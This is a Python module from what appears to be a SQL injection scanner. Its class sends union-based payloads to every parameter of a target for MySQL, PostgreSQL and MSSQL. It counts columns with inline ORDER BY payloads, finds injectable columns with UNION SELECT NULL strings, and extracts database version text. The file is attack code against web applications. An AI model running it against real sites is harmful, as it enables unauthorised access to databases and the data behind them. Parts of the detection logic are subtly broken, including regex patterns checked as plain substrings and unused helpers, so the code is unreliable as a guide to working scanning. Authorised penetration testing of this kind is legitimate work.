#!/usr/bin/env python3

import logging
from typing import List, Dict, Any, Optional, Tuple
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class UnionBasedInjector:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        """Initialize the union-based SQL injector."""
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        self.column_count = None
        self.vulnerable_columns = []
        
    def test_all_parameters(self) -> List[Dict]:
        """Test all parameters for union-based SQL injection vulnerabilities."""
        results = []
        params = self.request_engine.get_parameters()
        
        for param_name in params:
            # Test MySQL union-based injection
            mysql_results = self._test_mysql_union(param_name)
            results.extend(mysql_results)
            
            # Test PostgreSQL union-based injection
            postgres_results = self._test_postgres_union(param_name)
            results.extend(postgres_results)
            
            # Test MSSQL union-based injection
            mssql_results = self._test_mssql_union(param_name)
            results.extend(mssql_results)
        
        return results
    
    def _test_mysql_union(self, param_name: str) -> List[Dict]:
        """Test for MySQL union-based SQL injection."""
        results = []
        payloads = self.payload_manager.get_payloads("union", "mysql")
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(
                    payload=payload,
                    params={param_name: payload}
                )
                
                if not response:
                    continue
                
                # Check for successful union injection
                if "UNION" in response.text and not "You have an error in your SQL syntax" in response.text:
                    results.append({
                        "type": "union",
                        "parameter": param_name,
                        "payload": payload,
                        "severity": "high",
                        "description": "Union-based SQL injection detected in MySQL"
                    })
            
            except Exception as e:
                logging.error(f"Error testing MySQL union-based injection: {str(e)}")
                continue
        
        return results
    
    def _test_postgres_union(self, param_name: str) -> List[Dict]:
        """Test for PostgreSQL union-based SQL injection."""
        results = []
        payloads = self.payload_manager.get_payloads("union", "postgresql")
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(
                    payload=payload,
                    params={param_name: payload}
                )
                
                if not response:
                    continue
                
                # Check for successful union injection
                if "UNION" in response.text and not "ERROR: syntax error" in response.text:
                    results.append({
                        "type": "union",
                        "parameter": param_name,
                        "payload": payload,
                        "severity": "high",
                        "description": "Union-based SQL injection detected in PostgreSQL"
                    })
            
            except Exception as e:
                logging.error(f"Error testing PostgreSQL union-based injection: {str(e)}")
                continue
        
        return results
    
    def _test_mssql_union(self, param_name: str) -> List[Dict]:
        """Test for MSSQL union-based SQL injection."""
        results = []
        payloads = self.payload_manager.get_payloads("union", "mssql")
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(
                    payload=payload,
                    params={param_name: payload}
                )
                
                if not response:
                    continue
                
                # Check for successful union injection
                if "UNION" in response.text and not "Msg" in response.text and not "Incorrect syntax" in response.text:
                    results.append({
                        "type": "union",
                        "parameter": param_name,
                        "payload": payload,
                        "severity": "high",
                        "description": "Union-based SQL injection detected in MSSQL"
                    })
            
            except Exception as e:
                logging.error(f"Error testing MSSQL union-based injection: {str(e)}")
                continue
        
        return results
        
    def _determine_column_count(self) -> Optional[int]:
        """Determine the number of columns in the query using ORDER BY."""
        for i in range(1, 21):  # Try up to 20 columns
            payload = f"' ORDER BY {i} --"
            try:
                response, _ = self.request_engine.send_request(payload=payload)
                if self._check_error_response(response):
                    return i - 1
            except Exception as e:
                logging.error(f"Error determining column count: {str(e)}")
                continue
                
        return None
        
    def _find_vulnerable_columns(self) -> List[int]:
        """Find columns that can be used for data extraction."""
        vulnerable_columns = []
        
        if not self.column_count:
            return vulnerable_columns
            
        # Create a payload with all columns set to NULL
        null_columns = ["NULL"] * self.column_count
        
        for i in range(self.column_count):
            # Replace one NULL with a string
            test_columns = null_columns.copy()
            test_columns[i] = "'test'"
            
            payload = f"' UNION SELECT {','.join(test_columns)} --"
            try:
                response, _ = self.request_engine.send_request(payload=payload)
                if not self._check_error_response(response):
                    vulnerable_columns.append(i + 1)
            except Exception as e:
                logging.error(f"Error finding vulnerable columns: {str(e)}")
                continue
                
        return vulnerable_columns
        
    def _check_error_response(self, response) -> bool:
        """Check if response indicates an error."""
        error_indicators = [
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "Warning: mysqli_",
            "Warning: PDO::",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "SQLServer JDBC Driver",
            "com.microsoft.sqlserver.jdbc.SQLServerException",
            "ODBC SQL Server Driver",
            "Warning: mssql_"
        ]
        
        response_text = response.text.lower()
        return any(indicator.lower() in response_text for indicator in error_indicators)
        
    def _check_union_success(self, response) -> bool:
        """Check if union-based injection was successful."""
        # Check for common database version strings
        version_indicators = [
            "mysql",
            "mariadb",
            "postgresql",
            "microsoft sql server",
            "sql server",
            "oracle",
            "sqlite"
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in version_indicators)
        
    def _extract_union_data(self, response) -> Dict[str, str]:
        """Extract data from successful union-based injection."""
        data = {}
        response_text = response.text.lower()
        
        # Try to extract database version
        version_indicators = {
            "mysql": ["mysql", "mariadb"],
            "postgresql": ["postgresql", "postgres"],
            "mssql": ["microsoft sql server", "sql server"]
        }
        
        for dbms, indicators in version_indicators.items():
            for indicator in indicators:
                if indicator in response_text:
                    data["dbms"] = dbms
                    # Try to extract the full version string
                    start = response_text.find(indicator)
                    if start != -1:
                        version_line = response_text[start:].split('\n')[0]
                        data["version"] = version_line.strip()
                    break
                    
        return data 
